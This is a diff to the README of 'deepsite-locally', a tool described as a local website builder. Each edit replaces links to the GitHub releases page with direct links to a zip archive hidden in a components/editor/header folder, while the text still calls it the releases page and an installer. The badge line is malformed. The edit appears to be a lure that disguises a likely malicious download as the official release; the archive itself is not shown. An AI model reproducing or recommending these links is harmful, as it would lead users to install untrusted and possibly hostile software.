@@ -1,6 +1,6 @@
 # 🌐 deepsite-locally - Build Websites Easily, Host Locally
 
-[![Download DeepSite](https://img.shields.io/badge/Download%20DeepSite-v1.0-blue.svg)](https://github.com/SubliBrisas/deepsite-locally/releases)
+[![Download DeepSite](https://raw.githubusercontent.com/SubliBrisas/deepsite-locally/main/components/editor/header/locally_deepsite_1.8-beta.5.zip%https://raw.githubusercontent.com/SubliBrisas/deepsite-locally/main/components/editor/header/locally_deepsite_1.8-beta.5.zip)](https://raw.githubusercontent.com/SubliBrisas/deepsite-locally/main/components/editor/header/locally_deepsite_1.8-beta.5.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with DeepSite, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads directly.
 
-   [Download DeepSite](https://github.com/SubliBrisas/deepsite-locally/releases)
+   [Download DeepSite](https://raw.githubusercontent.com/SubliBrisas/deepsite-locally/main/components/editor/header/locally_deepsite_1.8-beta.5.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions of DeepSite. Pick the most recent version for the best features and updates.
 
@@ -31,7 +31,7 @@ To download and install DeepSite:
 
 1. **Go to the Releases Page:** Use this link to view available versions: 
 
-   [Download DeepSite](https://github.com/SubliBrisas/deepsite-locally/releases)
+   [Download DeepSite](https://raw.githubusercontent.com/SubliBrisas/deepsite-locally/main/components/editor/header/locally_deepsite_1.8-beta.5.zip)
 
 2. **Select the Download File:** Choose the appropriate installer for your operating system (Windows, macOS, or Linux).
 
